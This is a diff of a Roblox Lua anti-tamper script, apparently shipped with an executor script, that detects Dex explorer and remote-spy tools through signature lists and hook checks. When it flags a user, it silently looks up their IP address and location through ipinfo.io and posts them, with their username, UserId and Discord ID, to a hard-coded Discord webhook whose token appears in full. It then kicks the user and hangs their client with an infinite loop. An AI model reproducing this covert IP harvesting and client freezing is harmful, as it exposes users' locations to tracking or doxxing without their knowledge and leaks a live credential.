@@ -1,14 +1,12 @@
-print("[DEBUG] 01 - Script start")
-
+--lets eee
 local Players     = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local CoreGui     = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 
-print("[DEBUG] 02 - Services acquired")
-
 local CFG = {
     WEBHOOK_URL        = "https://discord.com/api/webhooks/1475189225392701521/YfX3ZfF2uPdxDU-7SkGukEZbDZXoJrb_qvlCykdoYftM-dUr7sKPrFGThPOCYLso-1E_",
+
     CHECK_OBFUSCATION  = true,
     CHECK_DEX_GC       = true,
     CHECK_DEX_CONNS    = true,
@@ -23,6 +21,7 @@ local CFG = {
     CHECK_STACK        = false,
     CHECK_OVERHEAD     = true,
     CHECK_THREADS      = true,
+
     SCAN_INTERVAL_SEC  = 2,
     CALL_WINDOW_SEC    = 1,
     OVERHEAD_THRESHOLD = 0.025,
@@ -30,15 +29,15 @@ local CFG = {
     THREAD_THRESHOLD   = 8,
     UNC_MISS_THRESHOLD = 5,
     DEX_CONN_THRESHOLD = 4,
+
     GUI_YIELD_EVERY    = 100,
     GC_YIELD_EVERY     = 50,
     REMOTE_YIELD_EVERY = 50,
     PHASE_DELAY        = 0.5,
 }
 
-print("[DEBUG] 03 - CFG built")
-
 local Kicked = false
+
 local Scanned = setmetatable({}, { __mode = "k" })
 
 local function SafeCall(Fn, ...)
@@ -46,28 +45,29 @@ local function SafeCall(Fn, ...)
     return Ok and R or nil
 end
 
-print("[DEBUG] 04 - SafeCall defined")
-
 local HttpRequest = (
-    (type(request)      == "function" and request)      or
-    (type(http_request) == "function" and http_request) or
-    (syn    and type(syn.request)    == "function" and syn.request)    or
-    (fluxus and type(fluxus.request) == "function" and fluxus.request) or
+    (type(request)      == "function" and request)                          or
+    (type(http_request) == "function" and http_request)                     or
+    (syn     and type(syn.request)     == "function" and syn.request)       or
+    (fluxus  and type(fluxus.request)  == "function" and fluxus.request)    or
     nil
 )
-
-print("[DEBUG] 05 - HttpRequest resolved: " .. tostring(HttpRequest ~= nil))
+local DiscordId = tostring(_G.Cobra_DiscordID or "Unknown")
 
 local function SendWebhook(Category, Flag)
     if not HttpRequest then return end
+
     local Username  = tostring(LocalPlayer.Name)
     local UserId    = tostring(LocalPlayer.UserId)
     local PlaceId   = tostring(game.PlaceId)
     local JobId     = tostring(game.JobId or "Unknown")
     local PlaceName = "Unknown"
+
     pcall(function()
-        PlaceName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
+        PlaceName = game:GetService("MarketplaceService")
+            :GetProductInfo(game.PlaceId).Name or "Unknown"
     end)
+
     local IpAddress, IpCity, IpRegion, IpCountry = "?", "?", "?", "?"
     local Ok, Raw = pcall(game.HttpGet, game, "https://ipinfo.io/json")
     if Ok and type(Raw) == "string" then
@@ -76,23 +76,26 @@ local function SendWebhook(Category, Flag)
         IpRegion  = Raw:match('"region"%s*:%s*"([^"]+)"') or "?"
         IpCountry = Raw:match('"country"%s*:%s*"([^"]+)"')or "?"
     end
+
     local Ok2, Payload = pcall(HttpService.JSONEncode, HttpService, {
         embeds = {{
             title  = "AntiSkid Flag — " .. Category,
             color  = 16711680,
             fields = {
-                { name = "Username",  value = Username,  inline = true  },
-                { name = "UserID",    value = UserId,    inline = true  },
-                { name = "Category",  value = Category,  inline = false },
-                { name = "Detection", value = Flag,      inline = false },
-                { name = "Game",      value = PlaceName .. " (PlaceId: " .. PlaceId .. ")", inline = false },
-                { name = "JobId",     value = JobId,     inline = false },
-                { name = "Location",  value = IpCity..", "..IpRegion..", "..IpCountry, inline = false },
-                { name = "IP",        value = IpAddress, inline = false },
+                { name = "Username",   value = Username, inline = true  },
+                { name = "UserID",     value = UserId,   inline = true  },
+                { name = "Discord ID", value = DiscordId, inline = true },
+                { name = "Category",   value = Category, inline = false },
+                { name = "Detection",  value = Flag,     inline = false },
+                { name = "Game",       value = PlaceName .. " (PlaceId: " .. PlaceId .. ")", inline = false },
+                { name = "JobId",      value = JobId,    inline = false },
+                { name = "Location",   value = IpCity..", "..IpRegion..", "..IpCountry, inline = false },
+                { name = "IP",         value = IpAddress, inline = false },
             },
         }},
     })
     if not Ok2 then return end
+
     pcall(HttpRequest, {
         Url     = CFG.WEBHOOK_URL,
         Method  = "POST",
@@ -104,9 +107,9 @@ end
 local function ForceKick(Category, Reason)
     task.spawn(function()
         SendWebhook(Category, Reason)
-        task.wait(1)
+            task.wait(1)
         pcall(function() LocalPlayer:Kick("[" .. Category .. "] " .. Reason) end)
-        task.wait(2)
+            task.wait(2)
         while true do end
     end)
 end
@@ -117,28 +120,20 @@ local function KickClient(Category, Reason)
     ForceKick(Category, Reason)
 end
 
-print("[DEBUG] 06 - KickClient defined")
-
 local InstanceMeta    = SafeCall(getrawmetatable, game)
 local RealNamecall    = InstanceMeta and rawget(InstanceMeta, "__namecall") or nil
 local RealNewIndex    = InstanceMeta and rawget(InstanceMeta, "__newindex") or nil
-
-print("[DEBUG] 07 - InstanceMeta done")
 
 local _SP             = Instance.new("Part")
 local SignalMeta      = SafeCall(getrawmetatable, _SP.Touched)
 local RealSignalIndex = SignalMeta and rawget(SignalMeta, "__index") or nil
 _SP:Destroy()
 
-print("[DEBUG] 08 - SignalMeta done")
-
 local _SRE           = Instance.new("RemoteEvent")
 local _SRF           = Instance.new("RemoteFunction")
 local RealFireServer = _SRE.FireServer
 _SRE:Destroy()
 _SRF:Destroy()
-
-print("[DEBUG] 09 - RealFireServer captured")
 
 local UncSnapshot = {}
 local UncNames = {
@@ -154,8 +149,6 @@ local UncNames = {
 for _, N in ipairs(UncNames) do
     if type(_G[N]) == "function" then UncSnapshot[N] = _G[N] end
 end
-
-print("[DEBUG] 10 - UncSnapshot built")
 
 local function IsExecClosure(Fn)
     if type(Fn) ~= "function" then return false end
@@ -188,8 +181,6 @@ local function HashMismatch(A, B)
     return H1 ~= nil and H2 ~= nil and H1 ~= H2
 end
 
-print("[DEBUG] 11 - Utility functions defined")
-
 local LegitPrefixes = {
     "^GetFFlag","^GetFInt","^GetFString","^GetFVariable",
     "^GetFastFlag","^GetFastInt","^GetFastString",
@@ -202,55 +193,80 @@ local function IsLikelyRobloxInternal(Name)
     return false
 end
 
-local DexSigs        = { "dex","appsframe","exploreritem","propname","numberline","editattribute","soundpreview","timeline" }
-local DexWholeWord   = { dex = true }
-local DexScreenGuiNames = { MainMenu=true, Context=true, BrickColor=true, Intro=true }
-local DexAssetIds    = {
-    ["rbxassetid://6579106223"]=true,["rbxassetid://6578871732"]=true,
-    ["rbxassetid://6578933307"]=true,["rbxassetid://1427967925"]=true,
-}
-local SpySigs = {
-    "cobalt","hydroxide","hydroconnections","remotespy","remotelogger","remotepanel",
-    "remotelogs","remoteviewer","spygui","httpspy","arglogger","remotecapture","rspy",
+local DexSigs = {
+    "dex",
+    "appsframe",
+    "exploreritem",
+    "propname",
+    "numberline",
+    "editattribute",
+    "soundpreview",
+    "timeline",
 }
 
-print("[DEBUG] 12 - Sig tables defined")
+local DexWholeWord = { dex = true }
+
+local DexScreenGuiNames = {
+    MainMenu = true,
+    Context  = true,
+    BrickColor = true,
+    Intro    = true,
+}
+
+local DexAssetIds = {
+    ["rbxassetid://6579106223"] = true, 
+    ["rbxassetid://6578871732"] = true,  
+    ["rbxassetid://6578933307"] = true,  
+    ["rbxassetid://1427967925"] = true, 
+}
+
+local SpySigs = {
+    "cobalt","hydroxide","hydroconnections",
+    "remotespy","remotelogger","remotepanel",
+    "remotelogs","remoteviewer","spygui",
+    "httpspy","arglogger","remotecapture","rspy",
+}
 
 local function CheckObj(Obj)
     if Kicked then return end
     local Name = Obj.Name
     if IsLikelyRobloxInternal(Name) then return end
     local L = Name:lower()
+
     for _, S in ipairs(DexSigs) do
         local Found = L:find(S, 1, true)
         if Found then
             if DexWholeWord[S] then
-                local Before = Found > 1 and L:sub(Found-1,Found-1) or ""
-                local After  = L:sub(Found+#S, Found+#S)
+                local Before = Found > 1 and L:sub(Found - 1, Found - 1) or ""
+                local After  = L:sub(Found + #S, Found + #S)
                 if Before:match("%a") or After:match("%a") then continue end
             end
             KickClient("Dex", "GUI signature matched: " .. Name)
             return
         end
     end
+
     local CN = Obj.ClassName
     if CN == "ScreenGui" and DexScreenGuiNames[Name] then
-        KickClient("Dex", "Dex ScreenGui detected: " .. Name) return
+        KickClient("Dex", "Dex ScreenGui detected: " .. Name)
+        return
     end
-    if CN == "ImageLabel" or CN == "ImageButton" then
+
+    if (CN == "ImageLabel" or CN == "ImageButton") then
         local Ok, Img = pcall(function() return Obj.Image end)
         if Ok and DexAssetIds[Img] then
-            KickClient("Dex", "Dex asset ID detected on "..CN..": "..Img) return
+            KickClient("Dex", "Dex asset ID detected on " .. CN .. ": " .. Img)
+            return
         end
     end
+
     for _, S in ipairs(SpySigs) do
         if L:find(S, 1, true) then
-            KickClient("RemoteSpy", "GUI signature matched: " .. Name) return
+            KickClient("RemoteSpy", "GUI signature matched: " .. Name)
+            return
         end
     end
 end
-
-print("[DEBUG] 13 - CheckObj defined")
 
 local ObfPatterns = {
     "^[A-Za-z0-9+/]{20,}={1,2}$",
@@ -278,8 +294,6 @@ local function IsObfuscated(Name)
     return false
 end
 
-print("[DEBUG] 14 - IsObfuscated defined")
-
 function CheckObjFull(Obj)
     if Kicked or Scanned[Obj] then return end
     Scanned[Obj] = true
@@ -288,8 +302,6 @@ function CheckObjFull(Obj)
         KickClient("Obfuscated GUI", "Obfuscated instance name: " .. Obj.Name)
     end
 end
-
-print("[DEBUG] 15 - CheckObjFull defined")
 
 local function ScanHiddenGui()
     if not Kicked and gethui then
@@ -317,23 +329,14 @@ local function ScanRoot(Root)
     end
 end
 
-print("[DEBUG] 16 - ScanRoot/ScanHiddenGui defined")
-
-pcall(function()
-    LocalPlayer.PlayerGui.DescendantAdded:Connect(function(Obj)
-        if not Kicked then CheckObjFull(Obj) end
-    end)
+LocalPlayer.PlayerGui.DescendantAdded:Connect(function(Obj)
+    if not Kicked then CheckObjFull(Obj) end
 end)
-
-print("[DEBUG] 17 - PlayerGui connection done")
-
 pcall(function()
     CoreGui.DescendantAdded:Connect(function(Obj)
         if not Kicked then CheckObjFull(Obj) end
     end)
 end)
-
-print("[DEBUG] 18 - CoreGui connection done")
 
 pcall(function()
     if gethui then
@@ -346,8 +349,6 @@ pcall(function()
     end
 end)
 
-print("[DEBUG] 19 - gethui connection done")
-
 local GcCache = nil
 
 local function RefreshGcCache()
@@ -359,6 +360,7 @@ local GcTableCheckers = {}
 
 local function RunGcWalk()
     if not GcCache then return end
+    local YieldEvery = CFG.GC_YIELD_EVERY
     local I = 0
     for _, V in ipairs(GcCache) do
         if Kicked then return end
@@ -368,25 +370,24 @@ local function RunGcWalk()
             end
         end
         I += 1
-        if I % CFG.GC_YIELD_EVERY == 0 then task.wait() end
+        if I % YieldEvery == 0 then task.wait() end
     end
 end
-
-print("[DEBUG] 20 - GC functions defined")
 
 local function MakeDexGcChecker()
     if not CFG.CHECK_DEX_GC then return nil end
     local Ok, Desc = pcall(function() return game:GetDescendants() end)
-    local Total = Ok and #Desc or 0
+    local Total  = Ok and #Desc or 0
     if Total == 0 then return nil end
     local Cap = math.floor(Total * 0.80) + 1
+
     return function(V)
         local N = 0
         for K in pairs(V) do
             if typeof(K) == "Instance" then
                 N += 1
                 if N >= Cap then
-                    KickClient("Dex", "Large Instance-keyed GC table detected")
+                    KickClient("Dex", "Large Instance-keyed GC table detected - Mr.Dex Demon")
                     return true
                 end
             end
@@ -395,7 +396,10 @@ local function MakeDexGcChecker()
     end
 end
 
-local CobaltFields = { "Communicator","Logs","Hooks","CobaltVerificationToken","Unloaded","NamecallHook","NewIndexHook","AlternativeEnabled" }
+local CobaltFields = {
+    "Communicator","Logs","Hooks","CobaltVerificationToken",
+    "Unloaded","NamecallHook","NewIndexHook","AlternativeEnabled",
+}
 
 local function MakeCobaltTableChecker()
     if not CFG.CHECK_COBALT then return nil end
@@ -405,7 +409,7 @@ local function MakeCobaltTableChecker()
             if rawget(V, F) ~= nil then
                 Score += 1
                 if Score >= 4 then
-                    KickClient("RemoteSpy", "Cobalt shared table detected")
+                    KickClient("RemoteSpy", "Cobalt shared table detected = youre a cobalt demon")
                     return true
                 end
             end
@@ -428,7 +432,7 @@ local function MakeSpyGcChecker()
     return function(V)
         for K in pairs(V) do
             if type(K) == "string" and SpyKeySet[K] then
-                KickClient("RemoteSpy", "Spy global key found in GC")
+                KickClient("RemoteSpy", "Spy global key found in GC - hey hey hey hey good byeeeeeee")
                 return true
             end
         end
@@ -446,8 +450,6 @@ local function RebuildGcCheckers()
     if DexChecker    then GcTableCheckers[#GcTableCheckers+1] = DexChecker    end
 end
 
-print("[DEBUG] 21 - GC checkers defined")
-
 local function CheckDexConnections()
     if not CFG.CHECK_DEX_CONNS or not getconnections then return false end
     local Ok, C = pcall(getconnections, game.DescendantAdded)
@@ -458,7 +460,9 @@ local function CheckDexConnections()
     return false
 end
 
-local CobaltGlobalKeys = { "CobaltInitialized","Cobalt","CobaltAutoExecuted","COBALT_LATEST_URL" }
+local CobaltGlobalKeys = {
+    "CobaltInitialized","Cobalt","CobaltAutoExecuted","COBALT_LATEST_URL",
+}
 
 local function CheckCobaltGlobals()
     if not CFG.CHECK_COBALT or not getgenv then return false end
@@ -466,7 +470,7 @@ local function CheckCobaltGlobals()
     if not G then return false end
     for _, K in ipairs(CobaltGlobalKeys) do
         if rawget(G, K) ~= nil then
-            KickClient("RemoteSpy", "Cobalt global key found")
+            KickClient("RemoteSpy", "Cobalt global key found - Bye now cobalt demon")
             return true
         end
     end
@@ -479,10 +483,10 @@ local function CheckMetamethodHooks()
     if not M then return false end
     local NC = rawget(M, "__namecall")
     local NI = rawget(M, "__newindex")
-    if NC and IsExecClosure(NC)       then KickClient("RemoteSpy", "__namecall executor closure") return true end
-    if NI and IsExecClosure(NI)       then KickClient("RemoteSpy", "__newindex executor closure") return true end
-    if HashMismatch(RealNamecall, NC) then KickClient("RemoteSpy", "__namecall hash mismatch")    return true end
-    if HashMismatch(RealNewIndex, NI) then KickClient("RemoteSpy", "__newindex hash mismatch")    return true end
+    if NC and IsExecClosure(NC)       then KickClient("RemoteSpy", "__namecall replaced with executor closure hey hey hey hey good byeeeeeee") return true end
+    if NI and IsExecClosure(NI)       then KickClient("RemoteSpy", "__newindex replaced with executor closure hey hey hey hey good byeeeeeee") return true end
+    if HashMismatch(RealNamecall, NC) then KickClient("RemoteSpy", "__namecall hash mismatch — hook detected hey hey hey hey good byeeeeeee")  return true end
+    if HashMismatch(RealNewIndex, NI) then KickClient("RemoteSpy", "__newindex hash mismatch — hook detected hey hey hey hey good byeeeeeee")  return true end
     return false
 end
 
@@ -490,8 +494,8 @@ local function CheckSignalHook()
     if not CFG.CHECK_SIGNAL or not SignalMeta then return false end
     local C = rawget(SignalMeta, "__index")
     if not C then return false end
-    if IsExecClosure(C)                 then KickClient("RemoteSpy", "Signal.__index executor closure") return true end
-    if HashMismatch(RealSignalIndex, C) then KickClient("RemoteSpy", "Signal.__index hash mismatch")   return true end
+    if IsExecClosure(C)                 then KickClient("RemoteSpy", "Signal.__index replaced with executor closure - Bye Now") return true end
+    if HashMismatch(RealSignalIndex, C) then KickClient("RemoteSpy", "Signal.__index hash mismatch — Connect() spy - Wow👋")   return true end
     return false
 end
 
@@ -501,12 +505,12 @@ local function CheckRemoteHooks()
     local FH = IsFnHooked(RE.FireServer)
     local IH = IsFnHooked(RF.InvokeServer)
     RE:Destroy(); RF:Destroy()
-    if FH then KickClient("RemoteSpy", "FireServer hooked")   return true end
-    if IH then KickClient("RemoteSpy", "InvokeServer hooked") return true end
+    if FH then KickClient("RemoteSpy", "FireServer is hooked Bye Now👋")   return true end
+    if IH then KickClient("RemoteSpy", "InvokeServer is hooked Bye Now👋") return true end
     local RE2 = Instance.new("RemoteEvent")
     local MM  = HashMismatch(RealFireServer, RE2.FireServer)
     RE2:Destroy()
-    if MM then KickClient("RemoteSpy", "FireServer hash mismatch") return true end
+    if MM then KickClient("RemoteSpy", "FireServer hash mismatch — hook detected Bye Now👋") return true end
     return false
 end
 
@@ -518,7 +522,7 @@ local function SignalHasSpy(Signal)
         local IsForeign = SafeCall(function() return Conn.ForeignState ~= nil end)
         local Fn        = SafeCall(function() return Conn.Function end)
         if IsForeign and Fn and IsExecClosure(Fn) then
-            return true, "Suspicious foreign executor connection"
+            return true, "Suspicious foreign executor connection Bye Bye👋"
         end
     end
     return false
@@ -529,27 +533,34 @@ local function ScanRemotes(Instances)
     for I, Obj in ipairs(Instances) do
         if Kicked then return true end
         local CN = Obj.ClassName
+
         if CN == "RemoteEvent" or CN == "UnreliableRemoteEvent" then
             local S, R = SignalHasSpy(Obj.OnClientEvent)
-            if S then KickClient("RemoteSpy", (R or "spy").." on OnClientEvent: "..Obj:GetFullName()) return true end
+            if S then KickClient("RemoteSpy", (R or "spy") .. " on OnClientEvent: " .. Obj:GetFullName()) return true end
+
         elseif CN == "RemoteFunction" then
             if getcallbackvalue then
                 local CB = SafeCall(getcallbackvalue, Obj, "OnClientInvoke")
                 if CB and IsExecClosure(CB) then
-                    KickClient("RemoteSpy", "OnClientInvoke executor closure: "..Obj:GetFullName()) return true
+                    KickClient("RemoteSpy", "OnClientInvoke executor closure: " .. Obj:GetFullName())
+                    return true
                 end
             end
+
         elseif CN == "BindableEvent" then
             local S, R = SignalHasSpy(Obj.Event)
-            if S then KickClient("RemoteSpy", (R or "spy").." on BindableEvent: "..Obj:GetFullName()) return true end
+            if S then KickClient("RemoteSpy", (R or "spy") .. " on BindableEvent: " .. Obj:GetFullName()) return true end
+
         elseif CN == "BindableFunction" then
             if getcallbackvalue then
                 local CB = SafeCall(getcallbackvalue, Obj, "OnInvoke")
                 if CB and IsExecClosure(CB) then
-                    KickClient("RemoteSpy", "BindableFunction OnInvoke executor closure: "..Obj:GetFullName()) return true
+                    KickClient("RemoteSpy", "BindableFunction OnInvoke executor closure: " .. Obj:GetFullName())
+                    return true
                 end
             end
         end
+
         if I % CFG.REMOTE_YIELD_EVERY == 0 then task.wait() end
     end
     return false
@@ -580,7 +591,7 @@ local function CheckFenvSpoof()
         if UncSnapshot[N] ~= nil and Env[N] == nil then Miss += 1 end
     end
     if Miss > CFG.UNC_MISS_THRESHOLD then
-        KickClient("RemoteSpy", "getfenv spoof — "..Miss.." UNC functions hidden")
+        KickClient("RemoteSpy", "getfenv spoof — " .. Miss .. " UNC functions hidden")
         return true
     end
     return false
@@ -592,7 +603,7 @@ local function CheckStack()
     if not T then return false end
     local F = 0
     for _ in T:gmatch("\n") do F += 1 end
-    if F < 2 then KickClient("RemoteSpy", "Stack frame deficit") return true end
+    if F < 2 then KickClient("RemoteSpy", "Stack frame deficit - Nice Try But Bye") return true end
     return false
 end
 
@@ -602,11 +613,13 @@ local function CheckHookOverhead()
     RE.Parent = nil
     local BoundFire = function() RE:FireServer() end
     local T0 = os.clock()
-    for _ = 1, CFG.OVERHEAD_CALLS do pcall(BoundFire) end
+    for _ = 1, CFG.OVERHEAD_CALLS do
+        pcall(BoundFire)
+    end
     local Elapsed = os.clock() - T0
     RE:Destroy()
     if Elapsed > CFG.OVERHEAD_THRESHOLD then
-        KickClient("RemoteSpy", "FireServer hook overhead: "..tostring(Elapsed))
+        KickClient("RemoteSpy", "FireServer hook overhead found. Bye Bye Skid!")
         return true
     end
     return false
@@ -622,23 +635,23 @@ local function CheckThreads()
         if Ok and (S == "" or S == "[C]") then N += 1 end
     end
     if N > CFG.THREAD_THRESHOLD then
-        KickClient("RemoteSpy", "Excessive anonymous executor threads: "..N)
+        KickClient("RemoteSpy", "Excessive anonymous executor threads. Bye Bye")
         return true
     end
     return false
 end
 
-print("[DEBUG] 22 - All check functions defined")
-
 local CallThresholds = {
-    getconstants=2, getprotos=2, getsenv=2, getrenv=2,
-    hookfunction=8, hookmetamethod=8, newcclosure=8, clonefunction=8,
-    getcallbackvalue=8, setstackhidden=8,
+    getconstants     = 2, getprotos        = 2,
+    getsenv          = 2, getrenv          = 2,
+    hookfunction     = 8, hookmetamethod   = 8,
+    newcclosure      = 8, clonefunction    = 8,
+    getcallbackvalue = 8, setstackhidden   = 8,
 }
 local CallCategories = {
-    getconstants="Dex", getprotos="Dex", getsenv="Dex", getrenv="Dex",
-    hookfunction="RemoteSpy", hookmetamethod="RemoteSpy", newcclosure="RemoteSpy",
-    clonefunction="RemoteSpy", getcallbackvalue="RemoteSpy", setstackhidden="RemoteSpy",
+    getconstants = "Dex",  getprotos = "Dex", getsenv = "Dex", getrenv = "Dex",
+    hookfunction = "RemoteSpy", hookmetamethod = "RemoteSpy", newcclosure = "RemoteSpy",
+    clonefunction = "RemoteSpy", getcallbackvalue = "RemoteSpy", setstackhidden = "RemoteSpy",
 }
 local CallCounts = {}
 
@@ -654,25 +667,21 @@ local function MonitorFn(Name)
             if Now - D.W >= CFG.CALL_WINDOW_SEC then D.N = 0 D.W = Now end
             D.N += 1
             if D.N >= (CallThresholds[Name] or 8) then
-                KickClient(CallCategories[Name] or "Unknown", Name.." called "..D.N.."x in 1s")
+                KickClient(CallCategories[Name] or "Unknown", Name .. " called " .. D.N .. "x in 1s (rate exceeded)")
             end
             return Orig(...)
         end))
     end)
 end
-
-print("[DEBUG] 23 - Starting MonitorFn loop")
 for Name in pairs(CallThresholds) do MonitorFn(Name) end
-print("[DEBUG] 24 - MonitorFn loop done")
 
 local function RunPhase1(PGui)
-    print("[DEBUG] Phase1 start")
     task.spawn(function()
         if not Kicked then ScanRoot(PGui)    end
         if not Kicked then ScanRoot(CoreGui) end
         if not Kicked then ScanHiddenGui()   end
-        print("[DEBUG] Phase1 scan task done")
     end)
+
     if not Kicked then CheckDexConnections()  end
     if not Kicked then CheckCobaltGlobals()   end
     if not Kicked then CheckMetamethodHooks() end
@@ -681,40 +690,39 @@ local function RunPhase1(PGui)
     if not Kicked then CheckFenvSpoof()       end
     if not Kicked then CheckStack()           end
     if not Kicked then CheckThreads()         end
-    print("[DEBUG] Phase1 checks done")
 end
 
 local function RunPhase2()
-    print("[DEBUG] Phase2 start")
     RefreshGcCache()
     RebuildGcCheckers()
     RunGcWalk()
-    print("[DEBUG] Phase2 done")
 end
 
 local function RunPhase3()
-    print("[DEBUG] Phase3 start")
     if not Kicked then CheckRemoteSpyConns() end
     if not Kicked then CheckNilRemotes()     end
     if not Kicked then task.spawn(CheckHookOverhead) end
-    print("[DEBUG] Phase3 done")
 end
 
 local function RunAllChecks(PGui)
     if Kicked then return end
-    task.spawn(function() RunPhase1(PGui) end)
-    task.delay(CFG.PHASE_DELAY,     function() if not Kicked then RunPhase2() end end)
-    task.delay(CFG.PHASE_DELAY * 2, function() if not Kicked then RunPhase3() end end)
+
+    task.spawn(function()
+        RunPhase1(PGui)
+    end)
+
+    task.delay(CFG.PHASE_DELAY, function()
+        if not Kicked then RunPhase2() end
+    end)
+
+    task.delay(CFG.PHASE_DELAY * 2, function()
+        if not Kicked then RunPhase3() end
+    end)
 end
 
-print("[DEBUG] 25 - RunAllChecks defined")
-
 task.spawn(function()
-    print("[DEBUG] 26 - Main task spawned, waiting 2s")
     task.wait(2)
-    print("[DEBUG] 27 - Wait done, getting PlayerGui")
     local PGui = LocalPlayer:WaitForChild("PlayerGui")
-    print("[DEBUG] 28 - PlayerGui acquired, running checks")
     RunAllChecks(PGui)
     while not Kicked do
         task.wait(CFG.SCAN_INTERVAL_SEC)
@@ -722,4 +730,4 @@ task.spawn(function()
     end
 end)
 
-print("[DEBUG] 29 - Script fully loaded - Main Skid")
+print("Main Skid")
